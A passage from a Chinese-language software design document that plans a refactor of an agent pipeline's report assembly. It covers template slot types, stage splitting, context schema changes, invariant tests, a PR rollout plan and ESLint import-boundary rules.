    const sections = this.buildSections(tpl, safePlan, sectionsOffsets);
    // 4. quality / quickView / factTable 走独立 builder（M3：新老共用避免 drift）
    const quality = this.qualityVerdictBuilder.build(
      segments.qualityInputs,
      sanitized,
    );
    return {
      content: {
        fullMarkdown,
        fullReportSize: Buffer.byteLength(fullMarkdown, "utf8"),
      },
      sections,
      citations: segments.citations,
      figures: segments.figures,
      factTable: segments.factTable,
      quickView: this.quickViewBuilder.build(
        sections,
        segments.citations,
        segments.figures,
      ),
      metadata: {
        ...segments.metadata,
        sanitizerVersion: sanitized.sanitizerVersion, // L-1：持久化版本
        templateId: tpl.id, // v1.3 加：template 形态可观测
      },
      quality,
    };
  }

  /**
   * v1.3 NB-1：assembleWithOffsets 内部按 slot.bodySource.kind 路由
   *  - kind === 'fromBodies' → 取 sanitized.bodies[field]
   *  - kind === 'fromBuilder' → 调对应 builder（this.tocBuilder / this.referencesBuilder / forewordBuilder）
   * builder 接收 segments（含 leaderForeword / citations / sections 已构建片段），输出 markdown body 字符串。
   * 删除 v1.2 的 `as never` 注释——所有 slot 编译期类型严格。
   */
}
```

### 4.2.1 ReportTemplate Slot 抽象（v1.3 NB-1 类型重设计）

为何引入：架构师 M2 反馈 — v1.1 的 `ReportSegments.bodies` 把 deep-research 形态硬编码（execSummary/preface/perDimension/crossDimAnalysis...）。Anthropic Managed Agent 形态的 single-agent ReAct 没有"plan→dim→writer"流水线，结构由 agent 自己决定 — custom-agents 一接就要返工。

v1.3 用 discriminated union `bodySource` 严格区分两类 slot 来源：

- `kind: 'fromBodies'` → 从 `segments.bodies[field]` 取（dim 段、cross-dim、risk 等 LLM 产出 body）
- `kind: 'fromBuilder'` → 调专用 builder（toc / references / foreword-{preface, conclusion, recommendations}）

builder 接受 `segments` 全集 + 已构建 sections 片段，输出 markdown body 字符串。**编译期严格，无 `as never` cast**。

**ReportTemplate v1.3 接口已写在 §4.2 代码块**（删 `bodyFrom` 改 `bodySource`，删 `DEEP_RESEARCH_TEMPLATE` 名改 `MULTI_DIMENSION_REPORT_TEMPLATE`）。

**Single-agent free-form template（custom-agents 形态）**：

```typescript
export const SINGLE_AGENT_FREEFORM_TEMPLATE: ReportTemplate = {
  id: "single-agent-freeform@v1",
  slots: [
    {
      kind: "fixed",
      key: "body",
      title: "回复",
      bodySource: { kind: "fromBodies", field: "executiveSummary" },
    },
  ],
};
```

后续 office / writing 模块可定义自己的 template，**ReportSegments.bodies 字段集合保持向后兼容（additive）**。

**关键不变量（v1.3 NB-6 修订 — template-aware）**：

```typescript
/**
 * 计算给定 template 与 segments 期望的 sections 数量。
 * 不是简单的"硬编码 +9"——按 slot.kind 计算：
 *   - fixed → 计入 1
 *   - loop  → 计入 segments.plan.dimensions.length
 *   - optional → 仅当对应 bodySource 解出非空内容时计入 1
 */
export function expectedSectionCount(
  template: ReportTemplate,
  segments: ReportSegments,
): number {
  let count = 0;
  for (const slot of template.slots) {
    if (slot.kind === "fixed") {
      count += 1;
    } else if (slot.kind === "loop" && slot.key === "perDimension") {
      // perDimension 总是按 plan.dimensions.length 计入（缺失 body 由占位文字补，section 仍存在）
      count += segments.plan.dimensions.length;
    } else if (slot.kind === "optional") {
      const present =
        slot.bodySource.kind === "fromBodies"
          ? Boolean(segments.bodies[slot.bodySource.field]?.trim())
          : Boolean(
              resolveBuilderHasContent(slot.bodySource.builder, segments),
            );
      if (present) count += 1;
    }
  }
  return count;
}

// 任意 (template, segments) 组合，必须满足：
expect(result.sections.length).toBe(expectedSectionCount(template, segments));

// 每个 section 的 offset 必须对齐 fullMarkdown
for (const sec of result.sections) {
  expect(
    result.content.fullMarkdown.slice(sec.startOffset, sec.endOffset),
  ).toMatch(new RegExp(`^## ${escapeRegex(sec.title)}`));
}

// dim sections 与 plan.dimensions[] 一一对齐（template 含 loop slot 时）
if (template.slots.some((s) => s.kind === "loop")) {
  const dimSections = result.sections.filter((s) => s.type === "dimension");
  expect(dimSections.length).toBe(segments.plan.dimensions.length);
  for (let i = 0; i < dimSections.length; i++) {
    expect(dimSections[i].title).toBe(segments.plan.dimensions[i].name);
    expect(dimSections[i].sourceDimensionId).toBe(
      segments.plan.dimensions[i].id,
    );
  }
}
```

**与既有 `report-artifact-assembler.service.ts` 共存策略**：

- 重命名旧实现 `report-artifact-assembler.service.ts` → `legacy-report-artifact-assembler.service.ts`
- 新实现独立 `structural-report-assembler.service.ts`
- harness facade 默认导出新实现；legacy 保留 1 个 release 周期防紧急回滚
- s8 stage 切到新接口 + segments 形态

### 4.3 Writer S8 stage 改造（ai-app/agent-playground）

**当前调用**：

```typescript
reportArtifact = deps.reportAssembler.assemble({
  topic, plan, researcherResults: [{fullMarkdown, ...}], analyst, writerReport, ...
});
```

**重构后调用（v1.1 修订）**：

```typescript
// S8 不再调 LLM 自己产 fullMarkdown —— 改为"采集 + 拼装"thin orchestration

// 1. 从已有 ctx / stage 产物中采集 segments（0 新 LLM call）
const segments: ReportSegments = {
  plan,
  bodies: {
    // 来自 S6 analyst.themeSummary
    executiveSummary: extractExecutiveSummary(analystOutput),
    // 来自 S10 leader foreword（如已跑），否则空（S10 之后会回填）
    preface: extractPreface(leaderForeword),
    // 来自 S3 per-dim chapter pipeline 已产出的 dim integrated markdown，剥 H2
    perDimension: researcherResults.map((r) =>
      stripTopLevelHeading(r.fullMarkdown),
    ),
    // 来自 S5 reconciliationReport（已是 markdown）
    crossDimAnalysis: extractCrossDimMarkdown(reconciliationReport),
    // 来自 S9 critic L4
    riskAssessment: renderRisksAsMarkdown(criticVerdict?.blindspots),
    // 来自 S6 / S10
    recommendations: extractRecommendations(analystOutput, leaderForeword),
    conclusion: extractConclusion(leaderForeword),
  },
  citations,
  figures,
  factTable,
  metadata,
  qualityInputs,
};

// 2. 拼装（纯 backend 字符串操作，0 token）
reportArtifact = deps.structuralReportAssembler.assemble(segments);
```

**S8 改造关键**：

- **0 新 LLM 调用**（v1.1 关键修订）—— S8 不再起草，仅采集 + 拼装
- 各 segment 来源映射见 §4.4.1 段来源对照表
- 旧 S8 内的 writer LLM call 保留但**改为可选 fallback**：当某 segment 来源缺失时（如 S5 / S6 失败降级），调一次轻量 LLM 补该单段 body
- writer prompt 仍存在（用于 fallback 补段），但只在异常路径触发

**与 S10 的时序关系（v1.2 B2 修订 — 拒绝 refill 模式）**：

v1.1 的 refill 模式（S8 半成品 + S10 后回填 preface/conclusion/recommendations + 重跑 offset）被 4 路评审一致 BLOCK：

- 架构师 B2: 破坏 ReportArtifact 不可变契约，wordCount/qualityVerdicts/sectionSelfEval 全要重算
- 代码审 B3: figures.sectionId / citations.occurrences[].offset 重算语义未定义
- 测试 B1: refill 后 offset off-by-one 没有 spec 覆盖

v1.2 决策：**拆 S8 为 S8-pre + S8-final，禁止半成品 ReportArtifact**：

```
[S3 per-dim chapter pipeline 完成 dim integrator] ─┐
[S5 reconciler]                                    │
[S6 analyst]                                       │
[S9 critic L4]                                     │
                                                   ↓
[S8-pre]   仅采集已有 segments，emit "report.preview" 事件让前端能看到部分进度
            （此时 reportArtifact 尚未生成，前端走 partial preview 渲染）
                                                   ↓
[S10 leader foreword + signoff]
   leader 看到的是 segments 摘要 + plan + verdicts（无需完整 fullMarkdown）
   产出 leaderForeword.{ preface, conclusion, recommendations, signoff }
                                                   ↓
[S8-final]  单次 structural assembler.assemble({...所有 segments + leaderForeword 字段})
            产出 ReportArtifact（首次 + 唯一一次拼装，offset 全部一次性确定）
                                                   ↓
[S8B sectionSelfEval × 每段]
[S11 persist]
```

**关键不变量**：`ReportArtifact` 一旦由 `S8-final.assemble()` 产出即为终态对象（immutable），任何后续阶段（S8B remediation 除外，见 §4.4.4）不得修改。S8B 触发的 sectionRemediation 改 perDimension[i] 后 → 完整调用 `S8-final.assemble()` 重新产出 ReportArtifact（不是改字段）。

**Stage hook 改动（v1.3 NB-5 修订 — 拒绝 stepId namespace 耦合）**：

- v1.2 写"共享 `s8` stepId 命名空间，通过 `phase: 'pre' | 'final'` 区分"被架构合规一轮 BLOCK：dispatcher 按 stepId 字符串匹配 hook，phase 字段无法区分 stage instance，会导致 hook 双触发。
- v1.3 决策：**两个独立 stepId** `s8-pre` 与 `s8-final`（与现有 `s8b-section-quality` / `s9b-objective-eval` 命名风格一致），各自注册独立 hook。`AGENT_PLAYGROUND_EVENTS` 中 `agent-playground.stage:lifecycle` 事件 payload.stepId 同步加入 `s8-pre` / `s8-final`（前端 socket handler 已用通用 stepId 字段，不需改）。
- S10 不再调 `assembler.refillSegment`，改为 `ctx.leaderForeword = { preface, conclusion, recommendations }` 写入 ctx，由 S8-final 读取拼装
- 现有 S10 已 mutate `ctx.reportArtifact.metadata.leaderForeword`，需调整为 mutate `ctx.leaderForeword`

**MissionContext schema 扩展（v1.3 NB-2 必修）**：

```typescript
// ai-app/agent-playground/services/mission/types/mission-context.ts
export interface MissionContext {
  // ... 既有字段 ...
  /** v1.3 NB-2：s8-pre 写入，s8-final / S8B 读取（拆 stage 后 ctx 共享键） */
  reportSegments?: ReportSegments;
  /** v1.3 NB-2：S10 写入，s8-final 读取（取代旧 ctx.reportArtifact.metadata.leaderForeword 路径） */
  leaderForeword?: {
    preface: string;
    conclusion: string;
    recommendations: string;
    signoff?: { signed: boolean; reasoning: string };
  };
  /** 既有：s8-final 产出后写入；S8B / S9 / S11 读取 */
  reportArtifact?: ReportArtifact;
}
```

ctx schema spec（§6.5 stage-integration.spec）锁这两条 key 的 writer / reader 一致性。

**降级路径（向后兼容）**：

- 老路径（writer 一次大 LLM 产 fullMarkdown）仍保留，feature flag `PLAYGROUND_USE_STRUCTURAL_ASSEMBLER`（默认 false → 灰度 → true → 删 legacy）
- 新路径任何环节 throw → catch + log warn + 自动降级到老路径，不让 mission 整体 fail

### 4.3.1 `report.preview` 前端事件契约（v1.3 MAJOR 新增）

s8-pre 完成后 emit 该事件让前端能渲染部分进度（不等 S10 + s8-final）。

**事件类型**：`agent-playground.report:preview`（新增到 `AGENT_PLAYGROUND_EVENTS` 注册表 + `playground-frontend-contract.spec` baseline）

**Payload schema（v1.4：Zod 强制 max() enforce 8KB）**：

```typescript
// ai-app/agent-playground/agent-playground.events.ts
{
  type: 'agent-playground.report:preview',
  schema: z.object({
    missionId: z.string().uuid(),
    /** s8-pre 产出的 partial segments —— 仅含已就绪段，preface/conclusion/recommendations 暂为 null */
    partialSegments: z.object({
      planSummary: z.string().max(2000),                               // 上限 2KB
      readySegmentKeys: z.array(z.string().max(64)).max(20),           // 上限 20 个 key × 64B = 1.3KB
      sectionTitles: z.array(z.string().max(200)).max(30),             // 上限 30 个 × 200B = 6KB（防 20 dim × 200 字符 撑爆）
      pendingSegmentKeys: z.array(z.string().max(64)).max(10),         // 上限 10 个
    }),
    timestamp: z.number(),
  }),
}
```

**前端消费**：`/agent-playground/team/[id]` 页面 socket handler 收到该事件后渲染 "已就绪 N 段 / 等待 leader 收尾 M 段" skeleton。`useMissionDetail` hook 暴露 `partialSegments?: PartialSegments`。

**事件大小**：≤ 8KB（不含 body 内容，只含元数据），由 Zod schema `.max()` 限制 enforce；超限时该字段 reject，emit fallback 极简 payload + warn log。

**测试**：`playground-frontend-contract.spec` 加入该 type；`stage-integration.spec` 验 s8-pre 完成时 spy adapter 收到该事件。

---

## 4.4 ⭐ 段产出来源映射（v1.1 新增 — 回答用户问题 1+2）

**v1.0 误解**：`writer S8 一次产出所有 segments`（执行摘要 + 前言 + 12 dim body + 跨维度分析 + 风险 + 建议 + 结论）→ 工作量爆炸 / 上下文爆炸。

**v1.1 真实**：所有 body 都已在现有 stage 产出（per-dim chapter pipeline / analyst / leader foreword / critic / reconciler）。`structural assembler` 只是**采集已有产物 → sanitize → 按模板拼装**，本质是字符串操作，**0 新增 LLM 调用主路径**。

### 4.4.1 段来源对照表

| Segment                            | 来源 stage                                | 来源数据字段                                                                                                                                        | 是否已有 LLM call                                | 适配工作                                               |
| ---------------------------------- | ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ | ------------------------------------------------------ |
| `executiveSummary` (执行摘要)      | S6 analyst                                | `analystOutput.themeSummary` + 关键 insights[]                                                                                                      | ✅ 已有（S6 一次）                               | sanitize（剥 H2）+ 字数裁剪到 ~250 字                  |
| `preface` (前言)                   | S10 leader foreword                       | `leaderForeword.whatWeAnswered` 等结构化字段                                                                                                        | ✅ 已有（S10 一次）                              | 拼接结构化字段为 markdown body                         |
| `perDimension[i]` (12 个 dim body) | S3 chapter pipeline 内 per-dim integrator | `researcherResult.fullMarkdown` 已含整合后内容                                                                                                      | ✅ 已有（每 dim 一次 integrator call，已经在跑） | 剥 H2（去掉每 dim 的 `## {dim.name}` 首行，body 留下） |
| `crossDimAnalysis` (跨维度分析)    | S5 reconciler                             | `reconciliationReport.markdown` 字段（已存在但当前只内部用）                                                                                        | ✅ 已有（S5 一次）                               | 复用为正式章节 body                                    |
| `riskAssessment` (风险评估)        | S9 critic L4                              | `criticVerdict.blindspots` + 已结构化 risks                                                                                                         | ✅ 已有（S9 一次）                               | 拼接结构化 risks 为 markdown body                      |
| `recommendations` (战略建议)       | S10 leader（唯一 ctx 写入点）             | `leaderForeword.recommendations`（s8-final 真实读取此字段；S6 `actionableRecommendations` 仅作为 leader 起草时的输入参考，不直接进 ReportArtifact） | ✅ 已有（S10 一次）                              | 一对一映射                                             |
| `conclusion` (结论)                | S10 leader foreword                       | `leaderForeword.conclusion` 字段                                                                                                                    | ✅ 已有（S10 一次）                              | 一对一映射                                             |
| `references` (参考文献)            | citations 数组                            | `citations[]` 已经在 assembler 现有逻辑生成                                                                                                         | —                                                | 纯 backend 渲染                                        |
| `toc` (目录)                       | sections[] 自动派生                       | sections.title 列表                                                                                                                                 | —                                                | 纯 backend 渲染                                        |

**关键观察**：

- 12 个 dim body 是**最重的部分**，但它们已经在 S3 chapter pipeline 中**逐 dim 并行产出**了（per-dim integrator agent 一次 LLM call / dim）。**S8 当前的"再次大 LLM call 拼整篇"是冗余且有害的**——它就是把 12 段 H2 + body 重新塞给 LLM 让它"组合"，这次一调失误（漏关 fence）就把 12 段挤压成 1 段。
- v1.1 后 **S8 不再调 LLM**（或仅做轻量"段间过渡句"补全），结构由 assembler 决定。

### 4.4.2 工作量分散（回答 Q1）

```
原 v1.0 想象：
  S8 [Writer LLM ──────────────────────────────────────────────] 一次 17 段产出
                                                                  ↑ 单点高负载

v1.1 实际（基于现有 stage 体系）：
  S3 [per-dim integrator × 12 dim] ──→ dim body × 12（已并行产出）
  S5 [reconciler]                  ──→ crossDimAnalysis body
  S6 [analyst]                     ──→ executiveSummary + recommendations
  S9 [critic L4]                   ──→ riskAssessment body
  S10 [leader foreword]            ──→ preface + conclusion
                                          ↓
  S8 [structural assembler 拼装]   ──→ fullMarkdown + sections[]
       （0 LLM call，纯 backend 字符串操作）
                                          ↓
  S8B [sectionSelfEval × 每段]     ──→ 不达标 → 调对应来源 stage 重生成该段
```

**结论**：写作负载本来就分散在 6+ stages 上。v1.0 文档错把 S8 描述为"一次性产出所有 segments"是误读 — 实际 S8 是"采集 + 拼装"角色。

### 4.4.3 上下文 Token 估算（回答 Q2）

| Stage 调用                            | 输入上下文规模                                           | 模型常见上限                         | 是否爆        |
| ------------------------------------- | -------------------------------------------------------- | ------------------------------------ | ------------- |
| S3 per-dim integrator（每 dim 一次）  | dim 内 5 chapter body 共 ~15K tokens + plan.dim 描述 ~1K | 128K (grok-4-1-fast) / 200K (Claude) | ❌ 远低于上限 |
| S5 reconciler                         | 12 dim summaries + factTable ≈ 20-30K tokens             | 同上                                 | ❌            |
| S6 analyst                            | 12 dim summaries + reconciliationReport ≈ 25-35K tokens  | 同上                                 | ❌ 仍 30% 内  |
| S8 structural assembler **(v1.1 后)** | **0 LLM**                                                | —                                    | ✅ 不调 LLM   |
| S9 critic L4                          | reportArtifact.sections preview + plan ≈ 20K tokens      | 同上                                 | ❌            |
| S10 leader foreword                   | reportArtifact summary + verdicts ≈ 15K tokens           | 同上                                 | ❌            |
| S8B sectionSelfEval（每段一次）       | 单段 body ~3-7K tokens + 评分 rubric ~1K                 | 同上                                 | ❌ 远低于上限 |

**v1.0 担心的"S8 一次喂 200K+ tokens"在 v1.1 不存在** —— S8 是 backend 拼装，不调 LLM。各 stage 单独 LLM call 的上下文规模本来就在 15-35K 范围，远低于现代模型上限（128K-1M），且按段独立。

### 4.4.4 质量闭环（回答 Q3）

**核心机制**：复用既有 `S8B section-quality-enhancement` stage，按 section 逐段评分 + 弱段补救。

```
S8-final [structural assembler 拼装] ──→ ReportArtifact { sections[] = expectedSectionCount(template, segments) 段 }
                                            ↓
S8B [for each section]:
   ├── sectionSelfEval (4 维度自评：深度 / 证据 / 可操作 / 写作)
   │     ↓ 任一维度 < 阈值（默认 60）
   ├── sectionRemediation:
   │     - dim section 弱 → 触发 per-dim chapter pipeline retry
   │     - executiveSummary 弱 → 重调 S6 analyst 单段 prompt
   │     - preface/conclusion 弱 → 重调 S10 leader 单段 prompt
   │     - crossDimAnalysis 弱 → 重调 S5 reconciler 单段 prompt
   │     - riskAssessment 弱 → 重调 S9 critic 单段 prompt
   ├── 重新 sectionSelfEval 验证补救后 score
   └── 更新 reportArtifact.sections[i] 对应内容
                                      ↓
S9 [Critic L4 跨段元评审]
S9B [10-dim 客观评审]
S10 [Leader foreword + signoff，看到稳定 21 段结构]
S11 [persist]
```

**与 v1.0 的关键差别**：

- v1.0：质量赌在"writer 一次产出整篇 markdown 的 prompt 约束"——LLM 失误 → 整篇崩
- v1.1：质量分散到每段独立闭环——某段弱只重生成那一段，**单段失败不污染其他段**

**新增 invariant 测**：

```typescript
it("S8B 每段独立补救后 reportArtifact.sections 数量 + 顺序保持", () => {
  // 模拟某段 sectionSelfEval 不达标
  // 触发 sectionRemediation 重生成该段
  // 断言：sections.length 不变，sections[i].sourceDimensionId 不变
});

it("S8B 单段 LLM 调用上下文 < 30K tokens", () => {
  // 取最大 dim body + rubric，prompt token 估算
  expect(estimatedTokens).toBeLessThan(30_000);
});
```

### 4.4.5 写作质量保证 — 端到端

| 质量层             | 现有机制                        | v1.3 加强                                                                                                                              |
| ------------------ | ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **结构稳定**       | ❌（LLM 写错 H2 → sections 错） | ✅ 物理 invariant `sections.length === expectedSectionCount(template, segments)`（按 §4.2.1 公式）                                     |
| **段内深度**       | ✅ S8B sectionSelfEval          | ✅ 不变，但 sections 稳定让评分点不漂移                                                                                                |
| **fence 配对**     | ❌（buildSectionTree 缺防御）   | ✅ MarkdownSanitizer 无条件配对                                                                                                        |
| **跨段一致**       | ✅ Critic L4（S9）              | ✅ 不变                                                                                                                                |
| **客观评分**       | ✅ S9B 10-dim                   | ✅ 不变                                                                                                                                |
| **leader signoff** | ✅ S10                          | ✅ leader 看到稳定结构（满配 12 dim → 17-20 段），coverage 评分不再被结构 bug 误导（mission `eafceb32` Leader 评 62 分就是被结构污染） |

---

## 5. 改造路径（按 PR 拆分）

| PR                    | 范围                                                                                                                                                                                                                  | 文件清单                                                                                                                                                                                              | 工作量                                                              | 阻塞项                          |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ------------------------------- |
| **PR-A0** ⭐          | **前置：DTO 字段对齐 + reconciliationReport schema 迁移 + ESLint 路径修正 + 现网治标兼容**（B1 + B4 + 安全 B9 + v1.3 NB-4）                                                                                           | 详见 §5.1                                                                                                                                                                                             | **1.5 天**（v1.3 修正：含 schema migration）                        | —                               |
| **PR-A1**             | engine: MarkdownSanitizer + spec + json-fence-parser 移入 markdown/                                                                                                                                                   | `ai-engine/content/markdown/markdown-sanitizer.types.ts` 新；`markdown-sanitizer.util.ts` 新；`json-fence-parser.utils.ts` 移入（git mv 保历史）；engine facade export                                | 1 天（v1.2 含 16 fixture + 状态机；v1.3 加 F17 + F18 = 18 fixture） | A0                              |
| **PR-A2**             | harness: ReportSegments dto + StructuralReportAssembler 骨架 + builder 派发（fromBodies / fromBuilder discriminated union） + spec                                                                                    | `ai-harness/.../report-segments.dto.ts` 新；`report-template.types.ts` 新（`ReportTemplate` + `MULTI_DIMENSION_REPORT_TEMPLATE`）；`structural-report-assembler.service.ts` 新；harness facade export | 1 天                                                                | A1                              |
| **PR-A3**             | harness: 把 buildCitations / buildFigures / buildQuickView / buildFactTable / buildMetadata / TocBuilder / ReferencesBuilder / ForewordBuilder 等子构建从 legacy 抽出复用（不重写，只重新 wire）                      | refactor only                                                                                                                                                                                         | 0.5 天                                                              | A2                              |
| **PR-A4**             | harness: spec 套件锁住 invariants（5+ 恶意 LLM 输出 fixture + per-template invariant + 并发）                                                                                                                         | `__tests__/structural-report-assembler.spec.ts`                                                                                                                                                       | 1 天                                                                | A2                              |
| **PR-A5a** ⭐ v1.3 拆 | app: 抽 segment extractors 工具方法（`extractExecutiveSummary` / `extractCrossDimMarkdown` 等纯函数）                                                                                                                 | `services/mission/workflow/util/segment-extractors.util.ts` 新 + spec                                                                                                                                 | 0.5 天                                                              | A2 + A4                         |
| **PR-A5b** ⭐ v1.3 拆 | app: 扩 MissionContext schema（reportSegments / leaderForeword 字段）+ 文档 + spec 锁 ctx schema                                                                                                                      | `mission-context.ts`；`mission-context.spec.ts`                                                                                                                                                       | 0.5 天                                                              | A5a                             |
| **PR-A5c** ⭐ v1.3 拆 | app: 拆 s8 stage 为 `s8-pre.stage.ts` + `s8-final.stage.ts`，注册 stepId + dispatcher hook + 注入到 mission-stage-bindings                                                                                            | `s8-pre.stage.ts` 新；`s8-final.stage.ts` 新；删 `s8-writer-draft-report.stage.ts`；`mission-stage-bindings.ts` 调整；`AGENT_PLAYGROUND_EVENTS` 加 `report:preview`                                   | 1 天                                                                | A5b                             |
| **PR-A5d** ⭐ v1.3 拆 | app: S10 改写 `ctx.leaderForeword`（不再 mutate `ctx.reportArtifact`）+ 前端 socket handler 消费 `report:preview` 事件 + skeleton UI                                                                                  | `s10-leader-foreword-and-signoff.stage.ts` ctx 写入路径；前端 `useMissionDetail` + `ArtifactMarkdown.tsx` partial preview skeleton                                                                    | 1 天                                                                | A5c                             |
| **PR-A6**             | app: 前端加 `rehype-sanitize` + KaTeX schema（B10 + v1.3 NB-3）；feature flag per-workspace 灰度（用 `feature_flag_workspace_grant` 表，§5.2）+ 5 个 prod e2e mission 验证                                            | `ArtifactMarkdown.tsx` rehype 配置 + KaTeX schema；`feature-flag.service.ts` per-workspace 接口 + Prisma migration；测试 N1 反馈                                                                      | **1.5-2 天**（v1.3 修正：含 KaTeX schema 调试 + per-workspace 表）  | A5d                             |
| **PR-A7**             | harness: legacy assembler 加 invariant fallback（plan.dimensions.length 强对齐 + 启发式 fuzzy match：`name.toLowerCase().includes(dim.name.slice(0,8).toLowerCase())` + 显式 missing 标签）—— 让现网 mission 立刻不崩 | `legacy-report-artifact-assembler.service.ts`；fuzzy match 阈值 spec                                                                                                                                  | 1 天                                                                | — (与 A1-A6 并行，先上 A7 治标) |
| **PR-A8**             | harness: sanitizerVersion 持久化兼容（L-1 安全） + 监控接入（sanitizer.appliedRules → metrics）；删除 legacy（确认 1 个 release 周期内无回滚需求后）                                                                  | `ReportArtifact.metadata.sanitizerVersion`；监控钩子；delete legacy                                                                                                                                   | 0.5 天                                                              | A6 + 1 周观察                   |

**总工作量：~9.5 天人 + 1 周生产观察**（v1.3 比 v1.2 +2.5 天：PR-A0 +0.5 / PR-A5 拆四子 +1 / PR-A6 +0.5-1 / 含 schema migration 与 KaTeX 调试）

### 5.1 PR-A0 详细文件清单（v1.3 NB-4 含 schema migration）

| 步骤 | 文件                                                                                                                                                                                           | 改动                                                                                                                                                                                                                                                                                                                                         |
| ---- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | `backend/src/modules/ai-app/agent-playground/services/agents/leader/leader.types.ts`                                                                                                           | `LeaderForewordOutput` 接口加 `preface: string; conclusion: string; recommendations: string`（保持 `whatWeAnswered/keyInsights/openQuestions` 等既有字段）                                                                                                                                                                                   |
| 2    | `backend/src/modules/ai-app/agent-playground/services/agents/analyst/analyst.types.ts`                                                                                                         | `AnalystOutput` 接口加 `actionableRecommendations: Array<{title, rationale, expectedImpact}>`                                                                                                                                                                                                                                                |
| 3    | `backend/src/modules/ai-app/agent-playground/services/agents/analyst/analyst.agent.ts`                                                                                                         | 第 121-125 行 `reconciliationReport.slice(0, 8000)` 改 `(typeof reconciliationReport === 'string' ? reconciliationReport : reconciliationReport.markdown).slice(0, 8000)`（向后兼容）                                                                                                                                                        |
| 4    | `backend/src/modules/ai-app/agent-playground/services/agents/reconciler/reconciler.agent.ts` 内联 Output Zod schema（v1.4 代码审反馈：reconciler.types.ts 当前不存在，schema 写在 agent 文件） | 把内联 `z.string().min(20).max(5000)` 改为 `z.object({ markdown: z.string().min(20).max(5000), structured: z.object({...}).optional() })`。**v1.4 策略改"对象唯一"**：Zod schema 不接受 string，避免 LLM structured output union 困惑；旧 string 输入由读取侧 wrap（步骤 3 的兼容分支），1 release 周期后下线。                              |
| 5    | `backend/src/modules/ai-app/agent-playground/services/agents/reconciler/reconciler.types.ts`（新建）                                                                                           | 抽出 `ReconcilerOutput` 类型 + `ReconciliationReport` 类型独立暴露，`reconciler.agent.ts` 内联 schema 改 `import type` 引用，让 `analyst.agent.ts` 也能 `import { ReconciliationReport } from '../reconciler/reconciler.types'`。LLM prompt 同步更新："输出顶层 JSON 含 `reconciliationReport: { markdown: string }` 对象（不再是字符串）"。 |
| 6    | `backend/.eslintrc.js` Section 10（v1.4 完整代码）                                                                                                                                             | 完整 patterns 列表见下面 §5.1.6 子节                                                                                                                                                                                                                                                                                                         |
| 7    | `backend/src/__tests__/architecture/layer-boundaries.spec.ts`                                                                                                                                  | allowlist 同步 6 项（与 .eslintrc.js 一致）                                                                                                                                                                                                                                                                                                  |
| 8    | `backend/src/modules/ai-app/agent-playground/services/agents/leader/leader.dto.ts`                                                                                                             | `LeaderPlanDto.dimensions[].name` 加 `@Matches(/^[^\r\n]{1,200}$/)` + `@MaxLength(200)`（v1.3 NB-MAJOR：双重防御）                                                                                                                                                                                                                           |
| 9    | `backend/src/modules/ai-app/agent-playground/services/agents/analyst/analyst.dto.ts`                                                                                                           | `actionableRecommendations` 字段加 `@MaxLength(2000)` per item title                                                                                                                                                                                                                                                                         |
| 10   | `backend/src/modules/ai-app/agent-playground/services/agents/leader/leader.dto.ts`                                                                                                             | `preface / conclusion / recommendations` 字段加 `@MaxLength(20000)`（防 LLM 撑爆）                                                                                                                                                                                                                                                           |
| 11   | `scripts/dump-playground-fixture.js` 新增                                                                                                                                                      | dump prod mission 的 events + chapter_drafts → 单 JSON fixture（spec 用）                                                                                                                                                                                                                                                                    |
| 12   | `backend/prisma/migrations/20260507_recon_report_jsonb/migration.sql`                                                                                                                          | `agent_playground_mission_events` payload `reconciliationReport` JSON 字段语义演进无 schema 改动（payload 是 JSONB，但加索引 `(payload->'output'->'result'->'reconciliationReport'->>'markdown')` 加速 fixture dump）                                                                                                                        |

工作量分布：DTO 字段（4h）+ schema migration & 兼容分支（3h）+ ESLint & spec（2h）+ dump 脚本（2h）+ 联调验证（1h）= 1.5 天。

#### 5.1.6 ESLint Section 10 完整代码（v1.4 架构合规反馈）

```javascript
// backend/.eslintrc.js Section 10：层级 import 边界守护
{
  files: ['src/modules/ai-app/**/*.ts'],
  rules: {
    'no-restricted-imports': ['error', {
      patterns: [
        // ai-app 不得穿透 ai-engine 内部，必须走 ai-engine/facade
        { group: ['*/ai-engine/llm/**', '!*/ai-engine/facade'], message: '走 ai-engine/facade，不要穿透 llm 内部' },
        { group: ['*/ai-engine/tools/**', '!*/ai-engine/facade'], message: '走 ai-engine/facade，不要穿透 tools 内部' },
        { group: ['*/ai-engine/rag/**', '!*/ai-engine/facade'], message: '走 ai-engine/facade，不要穿透 rag 内部' },
        { group: ['*/ai-engine/knowledge/**', '!*/ai-engine/facade'], message: '走 ai-engine/facade' },
        { group: ['*/ai-engine/skills/**', '!*/ai-engine/facade'], message: '走 ai-engine/facade' },
        { group: ['*/ai-engine/planning/**', '!*/ai-engine/facade'], message: '走 ai-engine/facade' },
        { group: ['*/ai-engine/safety/**', '!*/ai-engine/facade'], message: '走 ai-engine/facade' },
        { group: ['*/ai-engine/content/**', '!*/ai-engine/facade'], message: '走 ai-engine/facade（含 markdown sanitizer）' },
        { group: ['*/ai-engine/credentials/**', '!*/ai-engine/facade'], message: '走 ai-engine/facade' },
        // ai-app 不得穿透 ai-harness 内部
        { group: ['*/ai-harness/agents/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade' },
        { group: ['*/ai-harness/runner/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade' },
        { group: ['*/ai-harness/teams/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade' },
        { group: ['*/ai-harness/handoffs/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade' },
        { group: ['*/ai-harness/memory/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade' },
        { group: ['*/ai-harness/protocols/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade' },
        { group: ['*/ai-harness/evaluation/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade（含 StructuralReportAssembler / ReportTemplate / expectedSectionCount）' },
        { group: ['*/ai-harness/guardrails/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade' },
        { group: ['*/ai-harness/tracing/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade' },
